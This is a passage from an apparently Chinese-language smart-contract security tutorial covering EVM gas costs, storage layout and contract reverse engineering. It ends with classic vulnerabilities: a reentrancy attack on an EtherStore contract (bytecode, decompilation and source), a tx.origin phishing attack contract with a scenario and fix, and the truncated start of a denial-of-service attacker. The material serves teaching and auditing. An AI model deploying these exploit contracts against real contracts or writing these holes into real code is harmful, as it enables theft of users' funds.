0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3CCFD60B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x270 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x284 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x2C1 DUP2 PUSH2 0x2AE JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x2DC PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x2B8 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x327 PUSH2 0x322 PUSH2 0x31D DUP5 PUSH2 0x2E2 JUMP JUMPDEST PUSH2 0x302 JUMP JUMPDEST PUSH2 0x2E2 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x339 DUP3 PUSH2 0x30C JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x34B DUP3 PUSH2 0x32E JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x35B DUP2 PUSH2 0x340 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x376 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x352 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 CREATE2 0xC7 SSTORE DUP5 0xE3 DUP8 DIV DIV BLOCKHASH 0xC PUSH1 0xBD 0xE2 0xC7 0xB3 0xC1 SWAP13 0xBA 0x28 0xDB GAS PUSH28 0xD0E28352CC25AF68394B64736F6C6343000811003300000000000000
```

每个操作码都占一个字节，并且操作成本有大有小。操作码的操作成本是固定的或由公式算出来。例如，ADD 操作码固定需要3 gas。而将数据保存在存储中的操作码 SSTORE ，当把值从0设置为非0时消耗 20,000 gas，当把值改为0或保持为0不变时消耗 5000 gas。SSTORE 的开销实际上会其他变化，具体取决于是否已访问过这个值。

实际应用：

SLOAD 和 MLOAD 两个操作码用于从存储和内存中加载数据。MLOAD 成本固定 3 gas，而 SLOAD 的成本由一个公式决定：SLOAD 在交易过程中第一次访问一个值需要花费 2100 gas，之后每次访问需要花费 100 gas。**这意味着从内存加载数据比从存储加载数据便宜 97% 以上。**

```solidity
pragma solidity 0.8.7;
contract storageExample {
    uint256 sumOfArray;
    //多次访问storage
    function inefficcientSum(uint256 [] memory _array) public {
        for(uint256 i; i < _array.length; i++) {
            sumOfArray += _array[i];
        }
} 
    //多次访问memory
    function efficcientSum(uint256 [] memory _array) public {        
        uint256 tempVar;
        for(uint256 i; i < _array.length; i++) {
                tempVar += _array[i];
        }
        sumOfArray = tempVar;
    } 
}
```

#### Solidity数据存储位置

EVM有五个主要的数据位置：

- 存储（Storage）
- 内存（Memory）
- 调用数据（Calldata）
- 堆栈（Stack）
- 代码（Code）

![image](https://user-images.githubusercontent.com/87604354/211181868-ebfe99db-200b-4897-ba5c-0fdab45b06a3.png)

智能合约的存储是由槽组成的，其中：

- 每个存储槽可以包含长度不超过32字节的字。
- 存储槽从位置0开始（就像数组索引）。
- 总共有2²⁵⁶个存储槽可用（用于读/写）。

```solidity
pragma solidity ^0.8.0;
contract StorageContract {

    uint256 a = 10;  //独占一个槽
    uint64 b = 20;   //b c 共占一个槽
    uint128 c = 30;
    uint128 d = 40;
    
    function readStorageSlot(uint8 index) public view returns (bytes32 result) {
       assembly {
            result := sload(index)
        }
    }
}

```

在一些经典合约中，通过合理安排变量存储类型，进而节省空间：

aave-v3-core PoolStorage.sol

```solidity
// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.10;

import {UserConfiguration} from '../libraries/configuration/UserConfiguration.sol';
import {ReserveConfiguration} from '../libraries/configuration/ReserveConfiguration.sol';
import {ReserveLogic} from '../libraries/logic/ReserveLogic.sol';
import {DataTypes} from '../libraries/types/DataTypes.sol';

/**
 * @title PoolStorage
 * @author Aave
 * @notice Contract used as storage of the Pool contract.
 * @dev It defines the storage layout of the Pool contract.
 */
contract PoolStorage {
  using ReserveLogic for DataTypes.ReserveData;
  using ReserveConfiguration for DataTypes.ReserveConfigurationMap;
  using UserConfiguration for DataTypes.UserConfigurationMap;

  // Map of reserves and their data (underlyingAssetOfReserve => reserveData)
  mapping(address => DataTypes.ReserveData) internal _reserves;

  // Map of users address and their configuration data (userAddress => userConfiguration)
  mapping(address => DataTypes.UserConfigurationMap) internal _usersConfig;

  // List of reserves as a map (reserveId => reserve).
  // It is structured as a mapping for gas savings reasons, using the reserve id as index
  mapping(uint256 => address) internal _reservesList;

  // List of eMode categories as a map (eModeCategoryId => eModeCategory).
  // It is structured as a mapping for gas savings reasons, using the eModeCategoryId as index
  mapping(uint8 => DataTypes.EModeCategory) internal _eModeCategories;

  // Map of users address and their eMode category (userAddress => eModeCategoryId)
  mapping(address => uint8) internal _usersEModeCategory;

  // Fee of the protocol bridge, expressed in bps
  uint256 internal _bridgeProtocolFee;

  // Total FlashLoan Premium, expressed in bps
  uint128 internal _flashLoanPremiumTotal;

  // FlashLoan premium paid to protocol treasury, expressed in bps
  uint128 internal _flashLoanPremiumToProtocol;

  // Available liquidity that can be borrowed at once at stable rate, expressed in bps
  uint64 internal _maxStableRateBorrowSizePercent;

  // Maximum number of active reserves there have been in the protocol. It is the upper bound of the reserves list
  uint16 internal _reservesCount;
}

```

`_flashLoanPremiumTotal`与`_bridgeProtocolFee`交换位置？



当变量为基本类型时，将存储变量赋值给局部变量（在函数体中定义的）总是复制。然而，对于复杂或动态类型，规则有所不同。，如果你不希望被克隆，你可以将关键字`storage`传递给一个值。我们将这些变量描述为存储指针或存储引用类型的局部变量。在一个函数中，任何存储引用的变量总是指的是在合约的存储上预先分配的一块数据。换句话说，一个存储引用总是指的是一个状态变量。

Compound GovernorAlpha：

[compound-protocol/GovernorAlpha.sol at master · compound-finance/compound-protocol (github.com)](https://github.com/compound-finance/compound-protocol/blob/master/contracts/Governance/GovernorAlpha.sol)

```solidity
function propose(address[] memory targets, uint[] memory values, string[] memory signatures, bytes[] memory calldatas, string memory description) public returns (uint) {
        require(comp.getPriorVotes(msg.sender, sub256(block.number, 1)) > proposalThreshold(), "GovernorAlpha::propose: proposer votes below proposal threshold");
        require(targets.length == values.length && targets.length == signatures.length && targets.length == calldatas.length, "GovernorAlpha::propose: proposal function information arity mismatch");
        require(targets.length != 0, "GovernorAlpha::propose: must provide actions");
        require(targets.length <= proposalMaxOperations(), "GovernorAlpha::propose: too many actions");

        uint latestProposalId = latestProposalIds[msg.sender];
        if (latestProposalId != 0) {
          ProposalState proposersLatestProposalState = state(latestProposalId);
          require(proposersLatestProposalState != ProposalState.Active, "GovernorAlpha::propose: one live proposal per proposer, found an already active proposal");
          require(proposersLatestProposalState != ProposalState.Pending, "GovernorAlpha::propose: one live proposal per proposer, found an already pending proposal");
        }

        uint startBlock = add256(block.number, votingDelay());
        uint endBlock = add256(startBlock, votingPeriod());

        proposalCount++;
        uint proposalId = proposalCount;
        Proposal storage newProposal = proposals[proposalId];
        // This should never happen but add a check in case.
        require(newProposal.id == 0, "GovernorAlpha::propose: ProposalID collsion");
        newProposal.id = proposalId;
        newProposal.proposer = msg.sender;
        newProposal.eta = 0;
        newProposal.targets = targets;
        newProposal.values = values;
        newProposal.signatures = signatures;
        newProposal.calldatas = calldatas;
        newProposal.startBlock = startBlock;
        newProposal.endBlock = endBlock;
        newProposal.forVotes = 0;
        newProposal.againstVotes = 0;
        newProposal.canceled = false;
        newProposal.executed = false;

        latestProposalIds[newProposal.proposer] = newProposal.id;

        emit ProposalCreated(newProposal.id, msg.sender, targets, values, signatures, calldatas, startBlock, endBlock, description);
        return newProposal.id;
    }
```



Uniswap GovernorAlpha:

[governance/GovernorAlpha.sol at master · Uniswap/governance (github.com)](https://github.com/Uniswap/governance/blob/master/contracts/GovernorAlpha.sol)

```solidity
function propose(address[] memory targets, uint[] memory values, string[] memory signatures, bytes[] memory calldatas, string memory description) public returns (uint) {
        require(uni.getPriorVotes(msg.sender, sub256(block.number, 1)) > proposalThreshold(), "GovernorAlpha::propose: proposer votes below proposal threshold");
        require(targets.length == values.length && targets.length == signatures.length && targets.length == calldatas.length, "GovernorAlpha::propose: proposal function information arity mismatch");
        require(targets.length != 0, "GovernorAlpha::propose: must provide actions");
        require(targets.length <= proposalMaxOperations(), "GovernorAlpha::propose: too many actions");

        uint latestProposalId = latestProposalIds[msg.sender];
        if (latestProposalId != 0) {
          ProposalState proposersLatestProposalState = state(latestProposalId);
          require(proposersLatestProposalState != ProposalState.Active, "GovernorAlpha::propose: one live proposal per proposer, found an already active proposal");
          require(proposersLatestProposalState != ProposalState.Pending, "GovernorAlpha::propose: one live proposal per proposer, found an already pending proposal");
        }

        uint startBlock = add256(block.number, votingDelay());
        uint endBlock = add256(startBlock, votingPeriod());

        proposalCount++;
        Proposal memory newProposal = Proposal({
            id: proposalCount,
            proposer: msg.sender,
            eta: 0,
            targets: targets,
            values: values,
            signatures: signatures,
            calldatas: calldatas,
            startBlock: startBlock,
            endBlock: endBlock,
            forVotes: 0,
            againstVotes: 0,
            canceled: false,
            executed: false
        });

        proposals[newProposal.id] = newProposal;
        latestProposalIds[newProposal.proposer] = newProposal.id;

        emit ProposalCreated(newProposal.id, msg.sender, targets, values, signatures, calldatas, startBlock, endBlock, description);
        return newProposal.id;
    }

```

#### 智能合约逆向实操——安全事件逆向分析

具有安全漏洞的智能合约源代码：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract EtherStore {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

```

黑客的攻击合约Bytecode：

```json
{				
	"object": "608060405234801561001057600080fd5b506040516104c93803806104c9833981810160405281019061003291906100db565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610108565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100a88261007d565b9050919050565b6100b88161009d565b81146100c357600080fd5b50565b6000815190506100d5816100af565b92915050565b6000602082840312156100f1576100f0610078565b5b60006100ff848285016100c6565b91505092915050565b6103b2806101176000396000f3fe6080604052600436106100385760003560e01c806312065fe0146101025780639e5faafc1461012d578063acd2e6e51461013757610039565b5b670de0b6b3a764000060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631106101005760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100e757600080fd5b505af11580156100fb573d6000803e3d6000fd5b505050505b005b34801561010e57600080fd5b50610117610162565b60405161012491906102c7565b60405180910390f35b61013561016a565b005b34801561014357600080fd5b5061014c61028a565b6040516101599190610361565b60405180910390f35b600047905090565b670de0b6b3a764000034101561017f57600080fd5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b1580156101ef57600080fd5b505af1158015610203573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561027057600080fd5b505af1158015610284573d6000803e3d6000fd5b50505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000819050919050565b6102c1816102ae565b82525050565b60006020820190506102dc60008301846102b8565b92915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b600061032761032261031d846102e2565b610302565b6102e2565b9050919050565b60006103398261030c565b9050919050565b600061034b8261032e565b9050919050565b61035b81610340565b82525050565b60006020820190506103766000830184610352565b9291505056fea2646970667358221220f5c75584e3870404400c60bde2c7b3c19cba28db5a7bd0e28352cc25af68394b64736f6c63430008110033",
	"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x4C9 CODESIZE SUB DUP1 PUSH2 0x4C9 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x32 SWAP2 SWAP1 PUSH2 0xDB JUMP JUMPDEST DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x108 JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xA8 DUP3 PUSH2 0x7D JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xB8 DUP2 PUSH2 0x9D JUMP JUMPDEST DUP2 EQ PUSH2 0xC3 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0xD5 DUP2 PUSH2 0xAF JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xF1 JUMPI PUSH2 0xF0 PUSH2 0x78 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0xFF DUP5 DUP3 DUP6 ADD PUSH2 0xC6 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x3B2 DUP1 PUSH2 0x117 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x38 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x12065FE0 EQ PUSH2 0x102 JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x12D JUMPI DUP1 PUSH4 0xACD2E6E5 EQ PUSH2 0x137 JUMPI PUSH2 0x39 JUMP JUMPDEST JUMPDEST PUSH8 0xDE0B6B3A7640000 PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE LT PUSH2 0x100 JUMPI PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3CCFD60B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xE7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xFB JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x10E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x117 PUSH2 0x162 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x124 SWAP2 SWAP1 PUSH2 0x2C7 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x135 PUSH2 0x16A JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x143 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x14C PUSH2 0x28A JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x159 SWAP2 SWAP1 PUSH2 0x361 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 SELFBALANCE SWAP1 POP SWAP1 JUMP JUMPDEST PUSH8 0xDE0B6B3A7640000 CALLVALUE LT ISZERO PUSH2 0x17F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xD0E30DB0 PUSH8 0xDE0B6B3A7640000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1EF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x203 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3CCFD60B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x270 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x284 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x2C1 DUP2 PUSH2 0x2AE JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x2DC PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x2B8 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x327 PUSH2 0x322 PUSH2 0x31D DUP5 PUSH2 0x2E2 JUMP JUMPDEST PUSH2 0x302 JUMP JUMPDEST PUSH2 0x2E2 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x339 DUP3 PUSH2 0x30C JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x34B DUP3 PUSH2 0x32E JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x35B DUP2 PUSH2 0x340 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x376 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x352 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 CREATE2 0xC7 SSTORE DUP5 0xE3 DUP8 DIV DIV BLOCKHASH 0xC PUSH1 0xBD 0xE2 0xC7 0xB3 0xC1 SWAP13 0xBA 0x28 0xDB GAS PUSH28 0xD0E28352CC25AF68394B64736F6C6343000811003300000000000000 ",
	"sourceMap": "653:722:0:-:0;;;713:102;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;788:18;764:10;;:43;;;;;;;;;;;;;;;;;;713:102;653:722;;88:117:1;197:1;194;187:12;334:126;371:7;411:42;404:5;400:54;389:65;;334:126;;;:::o;466:96::-;503:7;532:24;550:5;532:24;:::i;:::-;521:35;;466:96;;;:::o;568:122::-;641:24;659:5;641:24;:::i;:::-;634:5;631:35;621:63;;680:1;677;670:12;621:63;568:122;:::o;696:143::-;753:5;784:6;778:13;769:22;;800:33;827:5;800:33;:::i;:::-;696:143;;;;:::o;845:351::-;915:6;964:2;952:9;943:7;939:23;935:32;932:119;;;970:79;;:::i;:::-;932:119;1090:1;1115:64;1171:7;1162:6;1151:9;1147:22;1115:64;:::i;:::-;1105:74;;1061:128;845:351;;;;:::o;653:722:0:-;;;;;;;"
}
```

逆向分析：

Internal Methods

```
func_007D(arg0) returns (r0)
func_009D(arg0) returns (r0)
func_00AF(arg0)
func_00C6(arg0, arg1) returns (r0)
func_00DB(arg0, arg1) returns (r0
```

Decompilation

```solidity
contract Contract {
    function main() {
        memory[0x40:0x60] = 0x80;
        var var0 = msg.value;
    
        if (var0) { revert(memory[0x00:0x00]); }
    
        var temp0 = memory[0x40:0x60];
        var temp1 = code.length - 0x04c9;
        memory[temp0:temp0 + temp1] = code[0x04c9:0x04c9 + temp1];
        memory[0x40:0x60] = temp1 + temp0;
        var0 = 0x0032;
        var var2 = temp0;
        var var1 = var2 + temp1;
        var0 = func_00DB(var1, var2);
        storage[0x00] = (var0 & 0xffffffffffffffffffffffffffffffffffffffff) | (storage[0x00] & ~0xffffffffffffffffffffffffffffffffffffffff);
        memory[0x00:0x03b2] = code[0x0117:0x04c9];
        return memory[0x00:0x03b2];
    }
    
    function func_007D(var arg0) returns (var r0) { return arg0 & 0xffffffffffffffffffffffffffffffffffffffff; }
    
    function func_009D(var arg0) returns (var r0) {
        var var0 = 0x00;
        var var1 = 0x00a8;
        var var2 = arg0;
        return func_007D(var2);
    }
    
    function func_00AF(var arg0) {
        var var0 = 0x00b8;
        var var1 = arg0;
        var0 = func_009D(var1);
    
        if (arg0 == var0) { return; }
        else { revert(memory[0x00:0x00]); }
    }
    
    function func_00C6(var arg0, var arg1) returns (var r0) {
        var var0 = memory[arg1:arg1 + 0x20];
        var var1 = 0x00d5;
        var var2 = var0;
        func_00AF(var2);
        return var0;
    }
    
    function func_00DB(var arg0, var arg1) returns (var r0) {
        var var0 = 0x00;
    
        if (arg0 - arg1 i>= 0x20) {
            var var1 = 0x00;
            var var2 = 0x00ff;
            var var3 = arg0;
            var var4 = arg1 + var1;
            return func_00C6(var3, var4);
        } else {
            var1 = 0x00f0;
            revert(memory[0x00:0x00]);
        }
    }

```

黑客的攻击合约源代码：

```solidity
contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

}
```

其他智能合约逆向工具：

https://ethervm.io/decompile

https://contract-library.com/

https://github.com/crytic/ida-evm

https://github.com/comaeio/porosit

https://github.com/meyer9/ethdasm

### 合约安全漏洞检测与审计

#### 经典漏洞

- tx.origin漏洞

  Solidity 中常用的两种验证发送方地址的方式：

  - msg.sender：仅会读取上层调用者的地址。
  - tx.origin：会读取启动交易的原始地址。

由下图可以看到，Bob 通过 A 合约调用 B 合约，B 合约又调用 C 合约。对于 C 合约来说，tx.origin 为 Bob ，msg.sender 为 B 合约。对于 B 合约来说，tx.origin 也是 Bob ， msg.sender 为 A 合约，对于 A 合约来说，tx.origin 与 msg.sender 均为 Bob 。这里我们可以得出一个结论：tx.origin 永远都是外部账户地址，msg.sender 可以为外部账户也可以为合约地址。

![image](https://user-images.githubusercontent.com/87604354/211181879-2a1a2347-d81d-418b-b972-75ebd3a4d868.png)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract Wallet {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function transfer(address payable _to, uint _amount) public {
        require(tx.origin == owner, "Not owner");

        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

//攻击合约由被欺骗的ETH持有者执行
contract Attack {
    address payable public owner;
    Wallet wallet;

    constructor(Wallet _wallet) {
        wallet = Wallet(_wallet);
        owner = payable(msg.sender);
    }

    function attack() public {
        wallet.transfer(owner, address(wallet).balance);
    }

    function getBalance() public view returns (uint) {
        return address(owner).balance;
    }
}
```

1. Alice 部署了 Wallet 合约并向合约中转入十个以太将该合约作为自己的钱包合约。
2. Eve 发现 Wallet 合约中有钱，部署 Attack 合约并在构造函数中传入 Wallet 合约的地址。
3. Eve 通过社会工程学调查到 Alice 特别喜欢网购包包，部署一个假的购物网站并将链接发送至 Alice 的邮箱。
4. Alice 收到邮箱好奇心驱使她点开链接，发现里面有自己喜欢的包包并且价格很低，一时心动就准备购买，但是购买的时候发现需要连接钱包完成签名才能注册成功，Alice 觉得这个网站非常棒很 Web3 ，想都没想直接签名了这笔交易。
5. 签名成功后 Alice 发现自己在 Wallet 合约中的所有以太已经被转移。

Alice 在注册时的签名并不是用于注册的，而是签名了调用 Attack.attack() 这笔交易。Attack.attack() 调用了 Wallet.transfer() 并传入 owner 也就是 Eve 的 EOA 地址，以及 Wallet 合约中的以太余额。因为签名这笔交易的地址为 Alice 的 EOA 地址，所以对于 Wallet 合约来说 tx.origin 就是 Alice 的 EOA 地址，所以 Eve 成功利用钓鱼伪造了 Alice 的身份，通过了权限检查并成功将 Wallet 合约中的以太转移到了自己的账户中。

修复漏洞：用msg.sender替代tx.origin

- 拒绝服务漏洞

  拒绝服务（Denial of Service），简称Dos，简而言之拒绝服务就是限制合法用户永久或在一段时间内无法使用智能合约。

  ```solidity
  pragma solidity 0.8.7;
  contract Auction {
      address public frontRunner;  
      uint256 public highestBid;  //初始为0
  
      // a.如果出价金额是大于highestBid，就将先前的投标金额退还给先前的投标人
      // b.如果两个条件都满足，则它会用新值更新最高出价和最高出价者 ( frontRunner )。
      function bid() public payable {
          require(msg.value > highestBid, "Need to be higher than highest bid");
          // 退款给原来的最高出价者  
          require(payable(frontRunner).send(highestBid), "Failed to send Ether");
   
          frontRunner = msg.sender;
          highestBid = msg.value;
      }
  }
  
  contract Attacker{
      Auction auction;
  
      constructor(Auction _auctionaddr){
